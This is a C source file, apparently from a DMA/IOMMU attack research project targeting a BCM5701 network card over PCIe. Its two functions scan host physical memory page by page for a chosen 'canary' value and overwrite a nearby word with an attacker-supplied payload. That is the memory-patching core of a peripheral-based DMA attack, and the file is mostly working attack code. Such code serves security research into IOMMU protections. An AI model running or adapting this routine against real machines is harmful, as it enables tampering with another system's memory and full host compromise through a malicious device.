#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#include "iownmmu/BCM5701/mbuf.h"
#include "iownmmu/BCM5701/attack.h"
#include "iownmmu/rw.h"
#include "pcie-backend.h"

/* Scan through memory looking for a 'canary' word.  If we find it,
 * replace a nearby word with a payload
 *
 * Parameters:
 * addr_start, addr_end: beginning and end of address range to scan
 * canary_word: 64 bit word to search memory for
 * canary_addr_delta: offset between the location of the canary and the word to write
 * payload: 64 bit word to write near the canary
 *
 * Returns:
 * Number of times the canary was found
 */

int scan_memory_canary(uint64_t addr_start, uint64_t addr_end,
  uint64_t canary_word, int64_t canary_addr_delta,
  uint64_t payload)
{
  uint64_t addr=0;
  uint32_t length=0;
  uint64_t page[4096/sizeof(uint64_t)];
  int found_count = 0;

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = (addr & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
    uint32_t ret = read_buffer(addr, sizeof(page), page);
    if (ret == 0) {
      for (int offset = 0; offset < sizeof(page); offset+=sizeof(uint64_t)) {
        if ( page[offset/sizeof(uint64_t)] == canary_word ) {
          uint32_t h=0, l=0;
          h = (addr >> 32LL);
          l = ((addr+offset) & 0xFFFFFFFFLL); 
          printf("\nFound canary at 0x%08x_%08x:", h, l);
          write_buffer(addr+offset+canary_addr_delta, sizeof(uint64_t), &payload);
          found_count++;          
        }
      }
    }

    char rv = '0' + (char) ret;
    putchar(rv);
//    usleep(1000000);
  }
  return found_count;
} 


/* Check a specific offset in each page looking for a 'canary' word.  If we find it,
 * replace a nearby word with a payload
 *
 * Parameters:
 * addr_start, addr_end: beginning and end of address range to scan
 * canary_word: 64 bit word to search memory for
 * canary_addr_delta: offset between the location of the canary and the word to write
 * payload: 64 bit word to write near the canary
 *
 * Returns:
 * Number of times the canary was found
 */

int check_memory_canary(uint64_t addr_start, uint64_t addr_end,
  uint32_t canary_word, uint64_t canary_offset, int64_t canary_addr_delta,
  uint64_t payload)
{
  uint64_t addr=0;
  uint32_t length=0;
  uint32_t page[4096/sizeof(uint32_t)];
  int found_count = 0;

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = ((addr+canary_offset) & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
    
    // Use memory_read rather than read_buffer since it's faster
//    uint32_t ret = read_buffer(addr+canary_offset, sizeof(uint64_t), page);
    int32_t ret = memory_read(addr+canary_offset, sizeof(uint32_t),
                    page, 100, &length);
    if (ret == 0) {
        if (*page == canary_word) {
          uint32_t h=0, l=0;
          h = (addr >> 32LL);
          l = ((addr+canary_offset) & 0xFFFFFFFFLL); 
          printf("\nFound canary at 0x%08x_%08x:", h, l);
          write_buffer(addr+canary_offset+canary_addr_delta, sizeof(uint64_t), &payload);
          found_count++; 
          while (1) { };
        }
    }

    char rv = '0' + (char) ret;
    putchar(rv);
  }
  return found_count;
} 


